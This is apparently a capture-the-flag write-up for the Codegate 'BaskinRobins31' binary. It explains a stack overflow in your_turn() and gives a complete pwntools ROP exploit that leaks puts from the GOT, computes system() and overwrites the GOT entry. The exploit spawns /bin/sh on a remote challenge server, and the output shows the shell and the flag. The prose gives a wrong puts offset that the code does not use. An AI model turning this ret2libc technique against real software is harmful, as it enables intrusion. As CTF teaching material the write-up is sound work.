```bash
file BaskinRobins31
```
>BaskinRobins31: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4abb416c74a16aaa8b4c9c6c366bed445c306037, not stripped

this task  involves leaking a libc function’s address from the GOT, and using it to determine the addresses of other functions in libc that we can return to.

The vulnerability is in the your_turn() function, where read() is allowed to write 0x190 (400 bytes) into a 0x96 (150 bytes) buffer
the following code shows the vulnerable part of the function 
```assembly
mov    edx,0x96 ;150 bytes 
mov    esi,0x0 ;fill buffer with 0
mov    rdi,rax ;copy adr of buffer to rdi 
call   0x4006f0 <memset@plt> ;memset(rdi,0,0x96)
[...]
mov    edx,0x190 ;size to be read <== Buffer Overflow 
mov    rsi,rax ;buff adr
mov    edi,0x0 ;stdin
call   0x400700 <read@plt>

```
**The high level solution to exploiting this is as follows:**
1. Leak the address of a library function in the GOT. In this case, we’ll leak puts()’s GOT entry
2. Get libc’s base address so we can calculate the address of other library functions. 
3. Compute system()'s address 
4. Overwrite a GOT entry’s address (puts) with system()’s address
5. Write **/bin/sh** to writeable area , in this case .bss
6. Invoke system("/bin/sh")


**Leaking a libc address** <br>
Grab puts()’s entry in the GOT:

```bash
$ objdump -R BaskinRobins31 |grep "puts"
0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```
If we can write puts()’s GOT entry back to us,We can do that by overwriting your_turn()’s saved return pointer to setup a ret2plt; in this case, write@plt. 
Since we’re exploiting a 64-bit binary, we need to populate the RDI, RSI, and RDX registers with the arguments for write(). 
So we need to return to a ROP gadget that sets up these registers, and then we can return to write@plt.<br>
**Get libc’s base address** <br>
Next we need to calculate libc’s base address in order to get the address of any library function, or even a gadget, in libc.
```bash
$ ldd BaskinRobins31 
	linux-vdso.so.1 =>  (0x00007ffc10bb0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8688442000)
	/lib64/ld-linux-x86-64.so.2 (0x00005621769b1000)
```

/lib/x86_64-linux-gnu/libc.so.6 contains the offsets of all the functions available to us in libc. To get puts()’s offset, we can use readelf:

```bash
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6|grep "puts"
   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   475: 000000000010bbe0  1262 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   651: 000000000010d590   703 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1097: 000000000006e030   354 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
  1611: 000000000006e030   354 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
  2221: 00000000000782b0    95 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
```
puts()’s offset is at 0x6e030. Subtracting this from the leaked puts()’s address will give us libc’s base address.
To find the address of any library function, we just do the reverse and add the function’s offset to libc’s base address. 
So to find system()’s address, we get its offset from libc.so.6, and add it to libc’s base address.

**Overwrite a GOT entry’s address** <br>
Now that we can get any library function address, we can do a ret2libc to complete the exploit. 
We’ll overwrite puts()’s GOT entry with the address of system(), so that when we trigger a call to puts(), it will call system(“/bin/sh”) instead


1.    Overwrite puts()’s GOT entry with the address of system() using read@plt.
2.    Write “/bin/sh” somewhere in memory using read@plt. We’ll use 0x602090 since it’s a writable location with a static address.
3.    Set RDI to the location of “/bin/sh” and return to system().

Here is the final exploit 
```python
#!/usr/bin/python

from pwn import * 

#p=process('./BaskinRobins31')
p=remote("ch41l3ng3s.codegate.kr",3131)
puts_off = 0x06f690
system_off = 0x45390
writeable = 0x602090 #.bss
puts_got = 0x00602020
puts_plt = 0x4006c0
mov_3pop = 0x400877
write_plt = 0x4006d0
read_plt = 0x400700

payload = ""
payload += "A"*(176) #Junk
payload += p64(0xcafebabe) #rbp
payload += p64(mov_3pop) # mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x1) #rdi
payload += p64(puts_got) #puts@got  => addr to read from 
payload += p64(0x8) #rdx-number of bytes to be written to stdout
payload += p64(write_plt) #write@plt



#Stage 1 :overwrite puts@got with system_adr
payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x0) #rdi stdin 
payload += p64(puts_got) #puts@got ==> addr to write to 
payload += p64(0x8) #size to be read
payload += p64(read_plt) #read@plt

#Stage 2 :write /bin/sh to .bss

payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x0) #rdi 
payload += p64(writeable) #rsi adr to write '/bin/sh' to 
payload += p64(0x8) #size to be read from stdin
payload += p64(read_plt) #read@plt


#Stage 3 : set RDI to "/bin/sh" and call system()
payload += p64(mov_3pop) #mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(writeable) #rdi ==>adr of '/bin/sh'
payload += p64(0x1) #junk
payload += p64(0x1) #junk
payload += p64(puts_plt) #puts@got which become system()



p.sendline(payload)
p.recvuntil(":(")
leaked_addr = p.recv(8)
puts_libc=hex(u64(leaked_addr))[:-4]
print "[+] Puts is at :"+puts_libc
libc_base = int(puts_libc,16) - puts_off
print "[+] Libc base is", hex(libc_base)
system_addr = libc_base + system_off
print "[+] System() is at", hex(system_addr)
print "[+] Sending system_addr", hex(system_addr)
p.send(p64(system_addr))
print "[+] Sending '/bin/sh'"
p.send("/bin/sh")
p.interactive(">> ")
#flag{The Korean name of "Puss in boots" is "My mom is an alien"}

```
I’ve commented the code heavily, so hopefully that will explain what’s going on ;) 
```
anisboss@anisboss-PC:/tmp/codegate/pwn$ python exploit.py 
[+] Opening connection to ch41l3ng3s.codegate.kr on port 3131: Done
[+] Puts is at :0x7f4c8f872690
[+] Libc base is 0x7f4c8f803000
[+] System() is at 0x7f4c8f848390
[+] Sending system_addr 0x7f4c8f848390
[+] Sending '/bin/sh'
[*] Switching to interactive mode
\x00\x00>> ls
BaskinRobins31
flag
>> cat flag
flag{The Korean name of "Puss in boots" is "My mom is an alien"}
```
